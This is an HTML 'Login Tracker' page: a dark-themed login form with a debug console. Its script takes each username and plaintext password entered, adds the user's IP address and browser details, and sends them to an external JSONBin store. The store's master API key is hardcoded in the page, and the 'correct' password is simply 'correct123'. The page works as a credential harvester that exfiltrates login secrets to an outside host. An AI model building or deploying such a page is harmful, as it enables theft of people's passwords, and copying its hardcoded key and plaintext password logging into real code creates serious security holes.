<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <!-- Fixes CORS -->
  <title>Login Tracker</title>
  <style>
    body {
      font-family: 'Source Sans Pro', sans-serif;
      background: #111111;
      color: white;
    }
    .input-icon {
      position: absolute;
      right: 0.75rem;
      top: 67%;
      transform: translateY(-50%);
      cursor: pointer;
    }
  </style>
</head>
<body class="min-h-screen flex flex-col justify-between px-4 py-6">

  <!-- Login Form -->
  <div class="w-full max-w-xl mx-auto">
    <div class="p-1.5">
      <h1 class="text-white font-bold text-lg mb-4">LOGIN</h1>
      
      <div class="mb-2.5">
        <label class="block text-sm mb-1">Username</label>
        <input type="text" id="username" placeholder="Username" class="w-full px-3 py-2.5 border border-orange-500 rounded bg-[#121212] text-white">
      </div>
      
      <div class="mb-2.5 relative">
        <label class="block text-sm mb-1">Password</label>
        <input type="password" id="password" placeholder="Password" class="w-full px-3 py-2.5 border border-orange-500 rounded bg-[#121212] text-white">
      </div>
      
      <button id="login-btn" class="w-full px-3 py-2.5 text-black font-semibold rounded bg-gradient-to-r from-yellow-400 to-orange-500">
        Sign In
      </button>

      <div id="error-message" class="text-red-500 mt-2 hidden"></div>
    </div>
  </div>

  <!-- Debug Console -->
  <div class="w-full max-w-xl mx-auto mt-8 p-4 bg-black text-green-400 text-xs font-mono rounded">
    <h3 class="font-bold mb-2">Debug Console</h3>
    <div id="debug-console"></div>
  </div>

  <!-- JavaScript -->
  <script>
    const JSONBIN_API_KEY = '$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y';
    const JSONBIN_BIN_ID = '67fa4eb78561e97a50fdfda5';

    const debugConsole = document.getElementById('debug-console');
    const errorMessage = document.getElementById('error-message');

    function logDebug(message) {
      const entry = document.createElement('div');
      entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
      debugConsole.prepend(entry);
      console.log(message);
    }

    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch {
        return 'unknown';
      }
    }

    function showError(message) {
      errorMessage.textContent = message;
      errorMessage.classList.remove('hidden');
      setTimeout(() => errorMessage.classList.add('hidden'), 5000);
    }

    async function logLogin(email, status, password) {
      try {
        logDebug(`Attempting to log: ${email} (${status})`);
        
        const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
          headers: { 'X-Master-Key': JSONBIN_API_KEY }
        });

        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);

        const { record } = await response.json();
        logDebug(`Current record: ${JSON.stringify(record, null, 2)}`);

        record.logins = record.logins || [];
        record.logins.push({
          email,
          password, // Password now included in the log
          status,
          timestamp: new Date().toISOString(),
          device: navigator.userAgent,
          ip: await getIP()
        });

        const updateResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
          method: 'PUT',
          headers: { 
            'Content-Type': 'application/json',
            'X-Master-Key': JSONBIN_API_KEY,
            'X-Bin-Versioning': 'false'
          },
          body: JSON.stringify(record)
        });

        if (!updateResponse.ok) throw new Error(`Update failed! status: ${updateResponse.status}`);

        const result = await updateResponse.json();
        logDebug(`Update successful: ${JSON.stringify(result, null, 2)}`);
        return true;
      } catch (error) {
        logDebug(`Error: ${error.message}`);
        showError(`Failed to log attempt. Check console for details.`);
        return false;
      }
    }

    document.getElementById('login-btn').addEventListener('click', async () => {
      const email = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      
      if (!email || !password) {
        showError('Please enter both username and password');
        return;
      }

      const isValidLogin = password === 'correct123';
      const status = isValidLogin ? 'success' : 'failed';

      const logged = await logLogin(email, status, password); // Password passed here

      if (logged) {
        alert(isValidLogin ? 'Login successful!' : 'Login failed - attempt logged');
        if (isValidLogin) {
          document.getElementById('username').value = '';
          document.getElementById('password').value = '';
        }
      }
    });

    // Initial debug
    logDebug('System initialized');
    logDebug(`Testing connection to bin ${JSONBIN_BIN_ID}...`);

    fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
      headers: { 'X-Master-Key': JSONBIN_API_KEY }
    })
      .then(res => res.json())
      .then(data => logDebug(`Bin connection successful. Current record count: ${data.record?.logins?.length || 0}`))
      .catch(err => logDebug(`Connection test failed: ${err.message}`));
  </script>
</body>
</html>
